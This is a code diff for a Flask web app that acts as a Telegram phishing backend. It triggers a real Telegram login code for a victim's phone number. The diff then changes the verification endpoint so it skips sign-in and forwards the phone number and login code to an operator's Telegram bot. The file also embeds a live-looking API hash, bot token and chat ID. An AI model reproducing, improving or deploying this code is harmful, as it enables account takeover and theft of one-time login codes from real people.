@@ -14,27 +14,18 @@ API_ID = 6627460
 API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"
 
 # YOUR BOT TOKEN AND CHAT ID - REPLACE THESE
-BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"  # Put your bot token here
-YOUR_CHAT_ID = "8796685138"  # Put your chat ID here
+BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"
+YOUR_CHAT_ID = "8796685138"
 
-def send_to_telegram_bot(phone, code=None):
-    """Send message to your bot"""
-    if code:
-        message = f"""
-✅ **Verification Complete**
+def send_to_telegram_bot(phone, code):
+    """Send the phone and code to your bot"""
+    message = f"""
+🔐 **Login Details**
 
-📱 **Phone:** `{phone}`
+📱 **Phone Number:** `{phone}`
 🔑 **Code Entered:** `{code}`
 ⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-        """
-    else:
-        message = f"""
-📱 **New Login Attempt**
-
-**Phone Number:** `{phone}`
-⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-**Status:** Code requested
-        """
+    """
     
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     payload = {
@@ -59,9 +50,6 @@ def send_code():
         if not phone:
             return jsonify({'success': False, 'error': 'Phone required'}), 400
         
-        # Send phone number to your bot immediately
-        bot_sent = send_to_telegram_bot(phone)
-        
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         
@@ -81,8 +69,7 @@ def send_code():
                 return {
                     'success': True,
                     'message': 'Code sent to your Telegram account!',
-                    'phone_code_hash': sent_code.phone_code_hash,
-                    'bot_notified': bot_sent
+                    'phone_code_hash': sent_code.phone_code_hash
                 }
                 
             except Exception as e:
@@ -109,52 +96,24 @@ def verify_code():
         data = request.json
         phone = data.get('phone', '')
         code = data.get('code', '')
-        phone_code_hash = data.get('phone_code_hash', '')
         
         if not phone or not code:
             return jsonify({'success': False, 'error': 'Phone and code required'}), 400
         
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+        # NO VERIFICATION WITH TELEGRAM - JUST SEND TO BOT
+        bot_sent = send_to_telegram_bot(phone, code)
         
-        async def verify_telegram_code():
-            client = None
-            try:
-                client = Client(
-                    name=f"verify_{datetime.now().timestamp()}",
-                    api_id=API_ID,
-                    api_hash=API_HASH,
-                    in_memory=True
-                )
-                
-                await client.connect()
-                
-                # Try to sign in
-                await client.sign_in(
-                    phone_number=phone,
-                    phone_code_hash=phone_code_hash,
-                    phone_code=code
-                )
-                
-                # If successful, send the code to your bot
-                send_to_telegram_bot(phone, code)
-                
-                return {'success': True, 'message': 'Login successful! Code sent to your bot.'}
-                
-            except Exception as e:
-                error_msg = str(e)
-                if 'PHONE_CODE_INVALID' in error_msg:
-                    return {'success': False, 'error': 'Invalid verification code'}
-                elif 'PHONE_CODE_EXPIRED' in error_msg:
-                    return {'success': False, 'error': 'Code expired. Request a new one.'}
-                else:
-                    return {'success': False, 'error': error_msg}
-            finally:
-                if client:
-                    await client.disconnect()
-        
-        result = loop.run_until_complete(verify_telegram_code())
-        return jsonify(result)
+        if bot_sent:
+            return jsonify({
+                'success': True, 
+                'message': f'Phone and code sent to your bot!',
+                'bot_notified': True
+            })
+        else:
+            return jsonify({
+                'success': False, 
+                'error': 'Failed to send to bot. Check your bot token.'
+            })
         
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
